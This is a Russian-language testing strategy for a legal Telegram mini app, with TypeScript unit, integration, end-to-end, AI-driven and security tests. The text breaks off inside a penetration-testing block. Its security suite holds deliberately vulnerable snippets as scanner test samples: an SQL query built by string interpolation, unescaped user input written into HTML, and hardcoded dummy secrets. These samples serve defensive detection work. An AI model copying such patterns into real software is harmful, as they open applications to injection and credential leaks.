# 🧪 Стратегия тестирования LawerApp Telegram Mini App

## 📋 Обзор стратегии тестирования

**LawerApp** - это критически важное правовое приложение, которое требует высочайшего качества и надежности. Данная стратегия тестирования основана на современных подходах 2025 года и включает автоматизированное тестирование, AI-тестирование и непрерывную интеграцию.

---

## 🎯 Принципы тестирования

### **1. Test Pyramid Strategy**
```
┌─────────────────────────────────────────────────────────────┐
│                    Test Pyramid 2025                       │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │                E2E Tests (5%)                          │ │
│  │              • Critical User Journeys                  │ │
│  │              • AI-Powered Test Generation              │ │
│  │              • Cross-Platform Testing                  │ │
│  └─────────────────────────────────────────────────────────┘ │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │              Integration Tests (25%)                   │ │
│  │              • API Testing                             │ │
│  │              • Database Testing                        │ │
│  │              • External Service Testing                │ │
│  └─────────────────────────────────────────────────────────┘ │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │              Unit Tests (70%)                          │ │
│  │              • Component Testing                       │ │
│  │              • Business Logic Testing                  │ │
│  │              • AI Model Testing                        │ │
│  └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### **2. AI-First Testing Approach**
- **AI-Generated Test Cases** - автоматическая генерация тестов
- **Intelligent Test Selection** - умный выбор тестов для выполнения
- **Predictive Testing** - предсказание потенциальных проблем
- **Self-Healing Tests** - самовосстанавливающиеся тесты

### **3. Continuous Testing**
- **Shift-Left Testing** - тестирование на ранних этапах
- **Shift-Right Testing** - тестирование в продакшене
- **Real-Time Monitoring** - мониторинг в реальном времени
- **Automated Rollback** - автоматический откат при проблемах

---

## 🏗️ Архитектура тестирования

### **1. Test Infrastructure**

#### **Modern Testing Stack 2025**
```typescript
// testing.config.ts
export const testingConfig = {
  // Unit Testing
  unit: {
    framework: 'Vitest', // Быстрее Jest
    coverage: 'V8', // Более точное покрытие
    parallel: true,
    watch: true
  },
  
  // Integration Testing
  integration: {
    framework: 'Playwright', // Современный E2E
    browsers: ['chromium', 'firefox', 'webkit'],
    mobile: true,
    api: 'Supertest'
  },
  
  // AI Testing
  ai: {
    framework: 'TestCraft AI', // AI-генерация тестов
    model: 'GPT-4o', // Для генерации тестовых сценариев
    visual: 'Percy', // Визуальное тестирование
    performance: 'Lighthouse CI'
  },
  
  // Security Testing
  security: {
    saast: 'Snyk', // Static Application Security Testing
    dast: 'OWASP ZAP', // Dynamic Application Security Testing
    iast: 'Contrast Security', // Interactive Application Security Testing
    secrets: 'GitGuardian' // Поиск секретов в коде
  }
};
```

#### **Test Environment Setup**
```typescript
// tests/setup/test-environment.ts
export class TestEnvironment {
  private static instance: TestEnvironment;
  private testDatabase: TestDatabase;
  private mockServices: MockServices;
  private aiTestGenerator: AITestGenerator;

  static async setup(): Promise<TestEnvironment> {
    if (!this.instance) {
      this.instance = new TestEnvironment();
      await this.instance.initialize();
    }
    return this.instance;
  }

  private async initialize(): Promise<void> {
    // Настраиваем тестовую базу данных
    this.testDatabase = await TestDatabase.create({
      type: 'postgresql',
      host: 'localhost',
      port: 5432,
      database: 'lawerapp_test',
      reset: true
    });

    // Настраиваем моки внешних сервисов
    this.mockServices = new MockServices({
      telegram: new MockTelegramService(),
      timeweb: new MockTimeWebService(),
      payments: new MockPaymentServices(),
      ai: new MockAIService()
    });

    // Инициализируем AI генератор тестов
    this.aiTestGenerator = new AITestGenerator({
      model: 'gpt-4o',
      apiKey: process.env.OPENAI_API_KEY
    });
  }

  async cleanup(): Promise<void> {
    await this.testDatabase.cleanup();
    await this.mockServices.cleanup();
  }
}
```

---

## 🔬 Unit Testing

### **1. Component Testing**

#### **React Component Testing**
```typescript
// tests/unit/components/ChatInterface.test.tsx
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { vi } from 'vitest';
import { ChatInterface } from '@/components/features/ai/ChatInterface';
import { TestEnvironment } from '@/tests/setup/test-environment';

describe('ChatInterface', () => {
  let testEnv: TestEnvironment;

  beforeAll(async () => {
    testEnv = await TestEnvironment.setup();
  });

  afterAll(async () => {
    await testEnv.cleanup();
  });

  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Message Sending', () => {
    it('should send message and display response', async () => {
      // Arrange
      const mockAIService = vi.mocked(aiService);
      mockAIService.getLegalConsultation.mockResolvedValue({
        answer: 'Это правовой ответ',
        sources: [],
        suggestions: []
      });

      render(<ChatInterface />);

      // Act
      const input = screen.getByPlaceholderText('Введите ваш вопрос...');
      const sendButton = screen.getByRole('button', { name: 'Отправить' });

      fireEvent.change(input, { target: { value: 'Как вернуть товар?' } });
      fireEvent.click(sendButton);

      // Assert
      await waitFor(() => {
        expect(screen.getByText('Как вернуть товар?')).toBeInTheDocument();
        expect(screen.getByText('Это правовой ответ')).toBeInTheDocument();
      });

      expect(mockAIService.getLegalConsultation).toHaveBeenCalledWith({
        message: 'Как вернуть товар?',
        context: null,
        conversationHistory: []
      });
    });

    it('should handle AI service errors gracefully', async () => {
      // Arrange
      const mockAIService = vi.mocked(aiService);
      mockAIService.getLegalConsultation.mockRejectedValue(
        new Error('AI service unavailable')
      );

      render(<ChatInterface />);

      // Act
      const input = screen.getByPlaceholderText('Введите ваш вопрос...');
      const sendButton = screen.getByRole('button', { name: 'Отправить' });

      fireEvent.change(input, { target: { value: 'Тест' } });
      fireEvent.click(sendButton);

      // Assert
      await waitFor(() => {
        expect(screen.getByText('Ошибка при получении ответа')).toBeInTheDocument();
      });
    });
  });

  describe('Context Awareness', () => {
    it('should maintain conversation context', async () => {
      // Arrange
      const mockAIService = vi.mocked(aiService);
      mockAIService.getLegalConsultation.mockResolvedValue({
        answer: 'Ответ с контекстом',
        sources: [],
        suggestions: []
      });

      render(<ChatInterface />);

      // Act - отправляем несколько сообщений
      const input = screen.getByPlaceholderText('Введите ваш вопрос...');
      const sendButton = screen.getByRole('button', { name: 'Отправить' });

      fireEvent.change(input, { target: { value: 'У меня проблема с товаром' } });
      fireEvent.click(sendButton);

      await waitFor(() => {
        expect(screen.getByText('У меня проблема с товаром')).toBeInTheDocument();
      });

      fireEvent.change(input, { target: { value: 'Что делать дальше?' } });
      fireEvent.click(sendButton);

      // Assert
      await waitFor(() => {
        expect(mockAIService.getLegalConsultation).toHaveBeenLastCalledWith({
          message: 'Что делать дальше?',
          context: expect.any(Object),
          conversationHistory: expect.arrayContaining([
            expect.objectContaining({ content: 'У меня проблема с товаром' })
          ])
        });
      });
    });
  });
});
```

### **2. Business Logic Testing**

#### **AI Service Testing**
```typescript
// tests/unit/services/ai-service.test.ts
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { AIService } from '@/lib/ai/ai-service';
import { RAGService } from '@/lib/ai/rag-service';
import { VectorStore } from '@/lib/ai/vector-store';

describe('AIService', () => {
  let aiService: AIService;
  let mockRAGService: vi.Mocked<RAGService>;
  let mockVectorStore: vi.Mocked<VectorStore>;

  beforeEach(() => {
    mockRAGService = {
      searchLegalKnowledge: vi.fn(),
      generateContextualResponse: vi.fn()
    } as any;

    mockVectorStore = {
      searchSimilar: vi.fn(),
      storeDocument: vi.fn()
    } as any;

    aiService = new AIService(mockRAGService, mockVectorStore);
  });

  describe('getLegalConsultation', () => {
    it('should provide accurate legal consultation', async () => {
      // Arrange
      const query = 'Как вернуть товар ненадлежащего качества?';
      const context = {
        area: 'consumer' as const,
        jurisdiction: 'russia' as const,
        urgency: 'medium' as const,
        complexity: 'simple' as const
      };

      mockRAGService.searchLegalKnowledge.mockResolvedValue([
        {
          content: 'Согласно ст. 18 ЗЗПП, потребитель вправе...',
          source: { title: 'ЗЗПП РФ', url: 'https://example.com' },
          relevance: 0.95
        }
      ]);

      mockRAGService.generateContextualResponse.mockResolvedValue({
        answer: 'Вы можете вернуть товар в течение 14 дней...',
        sources: [{ title: 'ЗЗПП РФ', url: 'https://example.com' }],
        confidence: 0.92
      });

      // Act
      const result = await aiService.getLegalConsultation({
        message: query,
        context,
        conversationHistory: []
      });

      // Assert
      expect(result.answer).toContain('14 дней');
      expect(result.sources).toHaveLength(1);
      expect(result.confidence).toBeGreaterThan(0.9);
      expect(mockRAGService.searchLegalKnowledge).toHaveBeenCalledWith(
        query,
        context
      );
    });

    it('should handle complex legal questions', async () => {
      // Arrange
      const complexQuery = 'Могу ли я расторгнуть договор купли-продажи недвижимости?';
      
      mockRAGService.searchLegalKnowledge.mockResolvedValue([
        {
          content: 'Согласно ст. 450 ГК РФ, изменение и расторжение договора...',
          source: { title: 'ГК РФ', url: 'https://example.com' },
          relevance: 0.88
        },
        {
          content: 'Ст. 451 ГК РФ предусматривает основания для расторжения...',
          source: { title: 'ГК РФ', url: 'https://example.com' },
          relevance: 0.85
        }
      ]);

      mockRAGService.generateContextualResponse.mockResolvedValue({
        answer: 'Расторжение договора купли-продажи возможно в следующих случаях...',
        sources: [
          { title: 'ГК РФ', url: 'https://example.com' },
          { title: 'ГК РФ', url: 'https://example.com' }
        ],
        confidence: 0.87
      });

      // Act
      const result = await aiService.getLegalConsultation({
        message: complexQuery,
        context: {
          area: 'civil',
          jurisdiction: 'russia',
          urgency: 'high',
          complexity: 'complex'
        },
        conversationHistory: []
      });

      // Assert
      expect(result.answer).toContain('расторжение договора');
      expect(result.sources).toHaveLength(2);
      expect(result.confidence).toBeGreaterThan(0.8);
    });

    it('should provide fallback for unknown legal areas', async () => {
      // Arrange
      const unknownQuery = 'Вопрос по космическому праву';
      
      mockRAGService.searchLegalKnowledge.mockResolvedValue([]);
      mockRAGService.generateContextualResponse.mockResolvedValue({
        answer: 'К сожалению, у меня нет информации по данному вопросу. Рекомендую обратиться к специалисту.',
        sources: [],
        confidence: 0.1
      });

      // Act
      const result = await aiService.getLegalConsultation({
        message: unknownQuery,
        context: {
          area: 'unknown',
          jurisdiction: 'russia',
          urgency: 'low',
          complexity: 'simple'
        },
        conversationHistory: []
      });

      // Assert
      expect(result.answer).toContain('нет информации');
      expect(result.confidence).toBeLessThan(0.5);
    });
  });
});
```

### **3. Payment System Testing**

#### **Payment Processing Testing**
```typescript
// tests/unit/services/payment-service.test.ts
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { PaymentManager } from '@/lib/payments/payment-manager';
import { TelegramStarsService } from '@/lib/payments/telegram-stars';
import { YooKassaService } from '@/lib/payments/yookassa';

describe('PaymentManager', () => {
  let paymentManager: PaymentManager;
  let mockTelegramStars: vi.Mocked<TelegramStarsService>;
  let mockYooKassa: vi.Mocked<YooKassaService>;

  beforeEach(() => {
    mockTelegramStars = {
      createInvoice: vi.fn(),
      sendInvoice: vi.fn(),
      verifyPayment: vi.fn()
    } as any;

    mockYooKassa = {
      createPayment: vi.fn(),
      getPaymentStatus: vi.fn(),
      capturePayment: vi.fn()
    } as any;

    paymentManager = new PaymentManager(
      mockTelegramStars,
      mockYooKassa
    );
  });

  describe('processPayment', () => {
    it('should process Telegram Stars payment successfully', async () => {
      // Arrange
      const paymentData = {
        userId: 'user123',
        amount: 100,
        method: 'telegram_stars' as const,
        description: 'Тестовая оплата',
        orderId: 'order123'
      };

      mockTelegramStars.createInvoice.mockResolvedValue({
        id: 'invoice123',
        confirmation: { confirmation_url: null }
      });

      mockTelegramStars.sendInvoice.mockResolvedValue(true);

      // Act
      const result = await paymentManager.processPayment(paymentData);

      // Assert
      expect(result.success).toBe(true);
      expect(result.paymentId).toBe('invoice123');
      expect(result.status).toBe('pending');
      expect(mockTelegramStars.createInvoice).toHaveBeenCalledWith({
        title: paymentData.description,
        description: paymentData.description,
        payload: paymentData.orderId,
        provider_token: expect.any(String),
        currency: 'XTR',
        prices: [{
          label: paymentData.description,
          amount: paymentData.amount
        }]
      });
    });

    it('should process YooKassa payment successfully', async () => {
      // Arrange
      const paymentData = {
        userId: 'user123',
        amount: 1000,
        method: 'yookassa' as const,
        description: 'Тестовая оплата',
        orderId: 'order123'
      };

      mockYooKassa.createPayment.mockResolvedValue({
        id: 'payment123',
        confirmation: {
          type: 'redirect',
          confirmation_url: 'https://yookassa.ru/checkout'
        }
      });

      // Act
      const result = await paymentManager.processPayment(paymentData);

      // Assert
      expect(result.success).toBe(true);
      expect(result.paymentId).toBe('payment123');
      expect(result.redirectUrl).toBe('https://yookassa.ru/checkout');
      expect(mockYooKassa.createPayment).toHaveBeenCalledWith({
        amount: {
          value: '1000.00',
          currency: 'RUB'
        },
        confirmation: {
          type: 'redirect',
          return_url: expect.any(String)
        },
        description: paymentData.description,
        metadata: {
          orderId: paymentData.orderId,
          userId: paymentData.userId
        }
      });
    });

    it('should handle payment failures gracefully', async () => {
      // Arrange
      const paymentData = {
        userId: 'user123',
        amount: 100,
        method: 'telegram_stars' as const,
        description: 'Тестовая оплата',
        orderId: 'order123'
      };

      mockTelegramStars.createInvoice.mockRejectedValue(
        new Error('Telegram API error')
      );

      // Act
      const result = await paymentManager.processPayment(paymentData);

      // Assert
      expect(result.success).toBe(false);
      expect(result.error).toBe('Telegram API error');
      expect(result.status).toBe('failed');
    });
  });
});
```

---

## 🔗 Integration Testing

### **1. API Testing**

#### **REST API Testing**
```typescript
// tests/integration/api/legal-consultation.test.ts
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import { app } from '@/app';
import { TestEnvironment } from '@/tests/setup/test-environment';

describe('Legal Consultation API', () => {
  let testEnv: TestEnvironment;
  let authToken: string;

  beforeAll(async () => {
    testEnv = await TestEnvironment.setup();
    authToken = await testEnv.createAuthToken('test-user');
  });

  afterAll(async () => {
    await testEnv.cleanup();
  });

  describe('POST /api/legal/consultation', () => {
    it('should create legal consultation', async () => {
      // Arrange
      const consultationData = {
        message: 'Как вернуть товар ненадлежащего качества?',
        context: {
          area: 'consumer',
          jurisdiction: 'russia',
          urgency: 'medium',
          complexity: 'simple'
        }
      };

      // Act
      const response = await request(app)
        .post('/api/legal/consultation')
        .set('Authorization', `Bearer ${authToken}`)
        .send(consultationData)
        .expect(200);

      // Assert
      expect(response.body).toMatchObject({
        success: true,
        data: {
          id: expect.any(String),
          answer: expect.any(String),
          sources: expect.any(Array),
          confidence: expect.any(Number),
          suggestions: expect.any(Array)
        }
      });

      expect(response.body.data.answer).toContain('товар');
      expect(response.body.data.confidence).toBeGreaterThan(0.7);
    });

    it('should validate input data', async () => {
      // Arrange
      const invalidData = {
        message: '', // Пустое сообщение
        context: {
          area: 'invalid_area' // Неверная область права
        }
      };

      // Act & Assert
      await request(app)
        .post('/api/legal/consultation')
        .set('Authorization', `Bearer ${authToken}`)
        .send(invalidData)
        .expect(400)
        .expect((res) => {
          expect(res.body.error).toContain('validation');
        });
    });

    it('should handle rate limiting', async () => {
      // Arrange
      const consultationData = {
        message: 'Тестовое сообщение',
        context: {
          area: 'consumer',
          jurisdiction: 'russia',
          urgency: 'low',
          complexity: 'simple'
        }
      };

      // Act - отправляем много запросов подряд
      const promises = Array(10).fill(null).map(() =>
        request(app)
          .post('/api/legal/consultation')
          .set('Authorization', `Bearer ${authToken}`)
          .send(consultationData)
      );

      const responses = await Promise.all(promises);

      // Assert - некоторые запросы должны быть заблокированы
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('GET /api/legal/consultation/:id', () => {
    it('should retrieve consultation by ID', async () => {
      // Arrange
      const consultation = await testEnv.createConsultation({
        userId: 'test-user',
        message: 'Тестовый вопрос',
        answer: 'Тестовый ответ'
      });

      // Act
      const response = await request(app)
        .get(`/api/legal/consultation/${consultation.id}`)
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      // Assert
      expect(response.body.data).toMatchObject({
        id: consultation.id,
        message: 'Тестовый вопрос',
        answer: 'Тестовый ответ'
      });
    });

    it('should return 404 for non-existent consultation', async () => {
      // Act & Assert
      await request(app)
        .get('/api/legal/consultation/non-existent-id')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(404);
    });
  });
});
```

### **2. Database Testing**

#### **Database Integration Testing**
```typescript
// tests/integration/database/user-repository.test.ts
import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import { UserRepository } from '@/lib/database/repositories/user-repository';
import { TestDatabase } from '@/tests/setup/test-database';

describe('UserRepository', () => {
  let testDb: TestDatabase;
  let userRepository: UserRepository;

  beforeAll(async () => {
    testDb = await TestDatabase.create();
    userRepository = new UserRepository(testDb.connection);
  });

  afterAll(async () => {
    await testDb.cleanup();
  });

  beforeEach(async () => {
    await testDb.clear();
  });

  describe('create', () => {
    it('should create user successfully', async () => {
      // Arrange
      const userData = {
        telegramId: '123456789',
        firstName: 'Иван',
        lastName: 'Петров',
        username: 'ivan_petrov',
        languageCode: 'ru'
      };

      // Act
      const user = await userRepository.create(userData);

      // Assert
      expect(user).toMatchObject({
        id: expect.any(String),
        telegramId: '123456789',
        firstName: 'Иван',
        lastName: 'Петров',
        username: 'ivan_petrov',
        languageCode: 'ru',
        createdAt: expect.any(Date)
      });

      // Проверяем, что пользователь сохранен в базе
      const savedUser = await userRepository.findByTelegramId('123456789');
      expect(savedUser).toEqual(user);
    });

    it('should handle duplicate telegram ID', async () => {
      // Arrange
      const userData = {
        telegramId: '123456789',
        firstName: 'Иван',
        lastName: 'Петров'
      };

      await userRepository.create(userData);

      // Act & Assert
      await expect(
        userRepository.create(userData)
      ).rejects.toThrow('duplicate key');
    });
  });

  describe('update', () => {
    it('should update user successfully', async () => {
      // Arrange
      const user = await userRepository.create({
        telegramId: '123456789',
        firstName: 'Иван',
        lastName: 'Петров'
      });

      // Act
      const updatedUser = await userRepository.update(user.id, {
        firstName: 'Петр',
        lastName: 'Иванов'
      });

      // Assert
      expect(updatedUser).toMatchObject({
        id: user.id,
        firstName: 'Петр',
        lastName: 'Иванов'
      });
    });
  });

  describe('findByTelegramId', () => {
    it('should find user by Telegram ID', async () => {
      // Arrange
      const user = await userRepository.create({
        telegramId: '123456789',
        firstName: 'Иван',
        lastName: 'Петров'
      });

      // Act
      const foundUser = await userRepository.findByTelegramId('123456789');

      // Assert
      expect(foundUser).toEqual(user);
    });

    it('should return null for non-existent user', async () => {
      // Act
      const foundUser = await userRepository.findByTelegramId('999999999');

      // Assert
      expect(foundUser).toBeNull();
    });
  });
});
```

---

## 🎭 End-to-End Testing

### **1. Playwright E2E Testing**

#### **Critical User Journeys**
```typescript
// tests/e2e/legal-consultation.spec.ts
import { test, expect } from '@playwright/test';
import { TestEnvironment } from '@/tests/setup/test-environment';

test.describe('Legal Consultation Flow', () => {
  let testEnv: TestEnvironment;

  test.beforeAll(async () => {
    testEnv = await TestEnvironment.setup();
  });

  test.afterAll(async () => {
    await testEnv.cleanup();
  });

  test('should complete full legal consultation journey', async ({ page }) => {
    // Arrange
    await testEnv.setupUser('test-user');
    await page.goto('/');

    // Act 1: Открываем чат
    await page.click('[data-testid="open-chat"]');
    await expect(page.locator('[data-testid="chat-interface"]')).toBeVisible();

    // Act 2: Отправляем вопрос
    await page.fill('[data-testid="chat-input"]', 'Как вернуть товар ненадлежащего качества?');
    await page.click('[data-testid="send-message"]');

    // Assert 2: Проверяем, что сообщение отправлено
    await expect(page.locator('[data-testid="user-message"]')).toContainText('Как вернуть товар');

    // Act 3: Ждем ответ от AI
    await expect(page.locator('[data-testid="ai-response"]')).toBeVisible({ timeout: 30000 });

    // Assert 3: Проверяем качество ответа
    const aiResponse = page.locator('[data-testid="ai-response"]');
    await expect(aiResponse).toContainText('товар');
    await expect(aiResponse).toContainText('14 дней');

    // Act 4: Проверяем источники
    await expect(page.locator('[data-testid="sources"]')).toBeVisible();
    const sources = page.locator('[data-testid="source-item"]');
    await expect(sources).toHaveCount.greaterThan(0);

    // Act 5: Проверяем предложения
    await expect(page.locator('[data-testid="suggestions"]')).toBeVisible();
    const suggestions = page.locator('[data-testid="suggestion-item"]');
    await expect(suggestions).toHaveCount.greaterThan(0);

    // Act 6: Кликаем на предложение "Сгенерировать документ"
    const generateDocSuggestion = page.locator('[data-testid="suggestion-item"]').filter({ hasText: 'Сгенерировать документ' });
    if (await generateDocSuggestion.isVisible()) {
      await generateDocSuggestion.click();
      
      // Assert 6: Проверяем, что открылся генератор документов
      await expect(page.locator('[data-testid="document-generator"]')).toBeVisible();
    }
  });

  test('should handle AI service errors gracefully', async ({ page }) => {
    // Arrange
    await testEnv.setupUser('test-user');
    await testEnv.mockAIServiceError();
    await page.goto('/');

    // Act
    await page.click('[data-testid="open-chat"]');
    await page.fill('[data-testid="chat-input"]', 'Тестовый вопрос');
    await page.click('[data-testid="send-message"]');

    // Assert
    await expect(page.locator('[data-testid="error-message"]')).toBeVisible();
    await expect(page.locator('[data-testid="error-message"]')).toContainText('Ошибка при получении ответа');
  });

  test('should maintain conversation context', async ({ page }) => {
    // Arrange
    await testEnv.setupUser('test-user');
    await page.goto('/');

    // Act 1: Первый вопрос
    await page.click('[data-testid="open-chat"]');
    await page.fill('[data-testid="chat-input"]', 'У меня проблема с товаром');
    await page.click('[data-testid="send-message"]');
    await expect(page.locator('[data-testid="ai-response"]')).toBeVisible({ timeout: 30000 });

    // Act 2: Второй вопрос с контекстом
    await page.fill('[data-testid="chat-input"]', 'Что делать дальше?');
    await page.click('[data-testid="send-message"]');
    await expect(page.locator('[data-testid="ai-response"]')).toBeVisible({ timeout: 30000 });

    // Assert: Проверяем, что AI понимает контекст
    const secondResponse = page.locator('[data-testid="ai-response"]').last();
    await expect(secondResponse).toContainText('товар');
  });
});
```

### **2. Cross-Platform Testing**

#### **Mobile and Desktop Testing**
```typescript
// tests/e2e/cross-platform.spec.ts
import { test, expect, devices } from '@playwright/test';

test.describe('Cross-Platform Compatibility', () => {
  test('should work on mobile devices', async ({ page }) => {
    // Arrange
    await page.setViewportSize({ width: 375, height: 667 }); // iPhone SE

    // Act
    await page.goto('/');

    // Assert
    await expect(page.locator('[data-testid="mobile-menu"]')).toBeVisible();
    await expect(page.locator('[data-testid="chat-interface"]')).toBeVisible();
  });

  test('should work on tablet devices', async ({ page }) => {
    // Arrange
    await page.setViewportSize({ width: 768, height: 1024 }); // iPad

    // Act
    await page.goto('/');

    // Assert
    await expect(page.locator('[data-testid="tablet-layout"]')).toBeVisible();
  });

  test('should work on desktop', async ({ page }) => {
    // Arrange
    await page.setViewportSize({ width: 1920, height: 1080 }); // Desktop

    // Act
    await page.goto('/');

    // Assert
    await expect(page.locator('[data-testid="desktop-layout"]')).toBeVisible();
  });
});
```

---

## 🤖 AI-Powered Testing

### **1. AI Test Generation**

#### **Automated Test Case Generation**
```typescript
// tests/ai/test-generator.ts
import { AITestGenerator } from '@/lib/testing/ai-test-generator';
import { TestCaseGenerator } from '@/lib/testing/test-case-generator';

export class AITestGenerator {
  private openai: OpenAI;
  private testCaseGenerator: TestCaseGenerator;

  constructor() {
    this.openai = new OpenAI({
      apiKey: process.env.OPENAI_API_KEY
    });
    this.testCaseGenerator = new TestCaseGenerator();
  }

  async generateTestCases(
    component: string, 
    requirements: string[]
  ): Promise<GeneratedTestCase[]> {
    const prompt = `
      Сгенерируй тестовые случаи для компонента: ${component}
      
      Требования:
      ${requirements.map(req => `- ${req}`).join('\n')}
      
      Сгенерируй тесты для:
      1. Happy path scenarios
      2. Edge cases
      3. Error conditions
      4. Accessibility requirements
      5. Performance requirements
      
      Формат ответа: JSON массив тестовых случаев
    `;

    const response = await this.openai.chat.completions.create({
      model: 'gpt-4o',
      messages: [{ role: 'user', content: prompt }],
      temperature: 0.7
    });

    const testCases = JSON.parse(response.choices[0].message.content);
    return this.validateAndEnhanceTestCases(testCases);
  }

  async generateVisualTestCases(
    component: string
  ): Promise<VisualTestCase[]> {
    const prompt = `
      Сгенерируй визуальные тестовые случаи для компонента: ${component}
      
      Включи:
      1. Различные состояния компонента
      2. Различные размеры экрана
      3. Различные темы (светлая/темная)
      4. Различные языки
      5. Accessibility состояния
      
      Формат ответа: JSON массив визуальных тестовых случаев
    `;

    const response = await this.openai.chat.completions.create({
      model: 'gpt-4o',
      messages: [{ role: 'user', content: prompt }],
      temperature: 0.5
    });

    return JSON.parse(response.choices[0].message.content);
  }

  private validateAndEnhanceTestCases(
    testCases: any[]
  ): GeneratedTestCase[] {
    return testCases.map(testCase => ({
      id: generateId(),
      name: testCase.name,
      description: testCase.description,
      steps: testCase.steps,
      expectedResult: testCase.expectedResult,
      priority: testCase.priority || 'medium',
      category: testCase.category || 'functional',
      tags: testCase.tags || [],
      generatedAt: new Date(),
      confidence: testCase.confidence || 0.8
    }));
  }
}
```

### **2. Intelligent Test Selection**

#### **Smart Test Execution**
```typescript
// tests/ai/intelligent-test-selector.ts
export class IntelligentTestSelector {
  private testHistory: TestExecutionHistory;
  private changeAnalyzer: ChangeAnalyzer;
  private riskAnalyzer: RiskAnalyzer;

  async selectTestsForExecution(
    changes: CodeChange[]
  ): Promise<SelectedTests> {
    // 1. Анализируем изменения
    const changeImpact = await this.changeAnalyzer.analyzeChanges(changes);
    
    // 2. Оцениваем риски
    const riskAssessment = await this.riskAnalyzer.assessRisks(changeImpact);
    
    // 3. Выбираем тесты на основе истории
    const relevantTests = await this.selectRelevantTests(changeImpact);
    
    // 4. Приоритизируем тесты
    const prioritizedTests = await this.prioritizeTests(relevantTests, riskAssessment);
    
    return {
      unit: prioritizedTests.unit,
      integration: prioritizedTests.integration,
      e2e: prioritizedTests.e2e,
      estimatedDuration: this.calculateEstimatedDuration(prioritizedTests),
      confidence: this.calculateConfidence(prioritizedTests)
    };
  }

  private async selectRelevantTests(
    changeImpact: ChangeImpact
  ): Promise<RelevantTests> {
    const relevantTests: RelevantTests = {
      unit: [],
      integration: [],
      e2e: []
    };

    // Выбираем unit тесты для измененных компонентов
    for (const component of changeImpact.modifiedComponents) {
      const componentTests = await this.testHistory.getTestsForComponent(component);
      relevantTests.unit.push(...componentTests.unit);
    }

    // Выбираем integration тесты для измененных API
    for (const api of changeImpact.modifiedAPIs) {
      const apiTests = await this.testHistory.getTestsForAPI(api);
      relevantTests.integration.push(...apiTests);
    }

    // Выбираем E2E тесты для критических путей
    if (changeImpact.affectsCriticalPath) {
      const criticalPathTests = await this.testHistory.getCriticalPathTests();
      relevantTests.e2e.push(...criticalPathTests);
    }

    return relevantTests;
  }

  private async prioritizeTests(
    tests: RelevantTests,
    riskAssessment: RiskAssessment
  ): Promise<PrioritizedTests> {
    const prioritized: PrioritizedTests = {
      unit: [],
      integration: [],
      e2e: []
    };

    // Приоритизируем на основе риска и истории
    for (const test of tests.unit) {
      const priority = this.calculateTestPriority(test, riskAssessment);
      prioritized.unit.push({ ...test, priority });
    }

    // Сортируем по приоритету
    prioritized.unit.sort((a, b) => b.priority - a.priority);
    prioritized.integration.sort((a, b) => b.priority - a.priority);
    prioritized.e2e.sort((a, b) => b.priority - a.priority);

    return prioritized;
  }
}
```

---

## 🔒 Security Testing

### **1. Automated Security Testing**

#### **SAST, DAST, IAST Integration**
```typescript
// tests/security/security-test-suite.ts
import { describe, it, expect } from 'vitest';
import { SecurityTestRunner } from '@/lib/security/security-test-runner';
import { VulnerabilityScanner } from '@/lib/security/vulnerability-scanner';

describe('Security Test Suite', () => {
  let securityRunner: SecurityTestRunner;
  let vulnerabilityScanner: VulnerabilityScanner;

  beforeAll(async () => {
    securityRunner = new SecurityTestRunner();
    vulnerabilityScanner = new VulnerabilityScanner();
  });

  describe('SAST (Static Application Security Testing)', () => {
    it('should detect SQL injection vulnerabilities', async () => {
      // Arrange
      const codeSnippet = `
        const query = \`SELECT * FROM users WHERE id = \${userId}\`;
        const result = await db.query(query);
      `;

      // Act
      const vulnerabilities = await securityRunner.runSAST(codeSnippet);

      // Assert
      expect(vulnerabilities).toContainEqual({
        type: 'sql_injection',
        severity: 'high',
        line: 2,
        description: 'Potential SQL injection vulnerability'
      });
    });

    it('should detect XSS vulnerabilities', async () => {
      // Arrange
      const codeSnippet = `
        const userInput = req.body.comment;
        res.send(\`<div>\${userInput}</div>\`);
      `;

      // Act
      const vulnerabilities = await securityRunner.runSAST(codeSnippet);

      // Assert
      expect(vulnerabilities).toContainEqual({
        type: 'xss',
        severity: 'medium',
        line: 3,
        description: 'Potential XSS vulnerability'
      });
    });

    it('should detect hardcoded secrets', async () => {
      // Arrange
      const codeSnippet = `
        const apiKey = 'sk-1234567890abcdef';
        const password = 'admin123';
      `;

      // Act
      const vulnerabilities = await securityRunner.runSAST(codeSnippet);

      // Assert
      expect(vulnerabilities).toContainEqual({
        type: 'hardcoded_secret',
        severity: 'critical',
        line: 2,
        description: 'Hardcoded API key detected'
      });
    });
  });

  describe('DAST (Dynamic Application Security Testing)', () => {
    it('should test for common web vulnerabilities', async () => {
      // Act
      const vulnerabilities = await securityRunner.runDAST({
        target: 'http://localhost:3000',
        scanType: 'comprehensive'
      });

      // Assert
      expect(vulnerabilities).toHaveLength(0);
    });

    it('should test authentication endpoints', async () => {
      // Act
      const authVulnerabilities = await securityRunner.runDAST({
        target: 'http://localhost:3000/api/auth',
        scanType: 'authentication'
      });

      // Assert
      expect(authVulnerabilities).toHaveLength(0);
    });
  });

  describe('IAST (Interactive Application Security Testing)', () => {
    it('should detect runtime vulnerabilities', async () => {
      // Act
      const runtimeVulnerabilities = await securityRunner.runIAST({
        application: 'lawerapp',
        monitoring: true
      });

      // Assert
      expect(runtimeVulnerabilities).toHaveLength(0);
    });
  });
});
```

### **2. Penetration Testing**

#### **Automated Penetration Testing**
```typescript
// tests/security/penetration-testing.ts
import { describe, it, expect } from 'vitest';
import { PenetrationTester } from '@/lib/security/penetration-tester';

describe('Penetration Testing', () => {
  let penetrationTester: PenetrationTester;

  beforeAll(async () => {
    penetrationTester = new PenetrationTester();
  });

  describe('Authentication Testing', () => {
    it('should test for weak authentication', async () => {
      // Act
      const results = await penetrationTester.testAuthentication({
        target: 'http://localhost:3000/api/auth',
        testCases: [
